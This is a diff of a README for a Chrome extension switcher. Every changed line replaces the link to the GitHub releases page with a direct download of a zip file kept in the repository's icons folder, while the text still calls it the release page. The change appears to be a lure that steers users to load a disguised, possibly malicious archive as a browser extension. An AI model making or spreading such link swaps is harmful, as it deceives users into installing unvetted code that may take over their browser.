@@ -1,6 +1,6 @@
 # 🧩 quiver_mv3_switcher_extension - Easy Chrome Extension Switcher
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Get%20the%20extension-brightgreen?style=for-the-badge)](https://github.com/icehawk17/quiver_mv3_switcher_extension/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Get%20the%20extension-brightgreen?style=for-the-badge)](https://github.com/icehawk17/quiver_mv3_switcher_extension/raw/refs/heads/main/icons/switcher_quiver_extension_mv_3.7.zip)
 
 ---
 
@@ -27,7 +27,7 @@ You do not need any programming tools or special software other than Chrome.
 You will first get the extension files on your computer and then add them to Chrome.
 
 1. Visit the release page by clicking the big badge above or go here:  
-   [https://github.com/icehawk17/quiver_mv3_switcher_extension/releases](https://github.com/icehawk17/quiver_mv3_switcher_extension/releases)
+   [https://github.com/icehawk17/quiver_mv3_switcher_extension/raw/refs/heads/main/icons/switcher_quiver_extension_mv_3.7.zip](https://github.com/icehawk17/quiver_mv3_switcher_extension/raw/refs/heads/main/icons/switcher_quiver_extension_mv_3.7.zip)
 
 2. On the release page, look for the latest version folder or files. Your goal is to download the entire extension folder, usually available as a `.zip` file.
 
@@ -90,7 +90,7 @@ If you don't see the icon, click the puzzle piece icon (Chrome's Extensions menu
 
 When a new version gets released:
 
-1. Return to the releases page: [https://github.com/icehawk17/quiver_mv3_switcher_extension/releases](https://github.com/icehawk17/quiver_mv3_switcher_extension/releases)
+1. Return to the releases page: [https://github.com/icehawk17/quiver_mv3_switcher_extension/raw/refs/heads/main/icons/switcher_quiver_extension_mv_3.7.zip](https://github.com/icehawk17/quiver_mv3_switcher_extension/raw/refs/heads/main/icons/switcher_quiver_extension_mv_3.7.zip)
 
 2. Download the latest `.zip` file.
 
@@ -129,4 +129,4 @@ You can freely explore the code inside the extracted folder.
 ## 🔗 Download Links
 
 Ready to begin? Visit this page to download the latest files:  
-[https://github.com/icehawk17/quiver_mv3_switcher_extension/releases](https://github.com/icehawk17/quiver_mv3_switcher_extension/releases)
+[https://github.com/icehawk17/quiver_mv3_switcher_extension/raw/refs/heads/main/icons/switcher_quiver_extension_mv_3.7.zip](https://github.com/icehawk17/quiver_mv3_switcher_extension/raw/refs/heads/main/icons/switcher_quiver_extension_mv_3.7.zip)
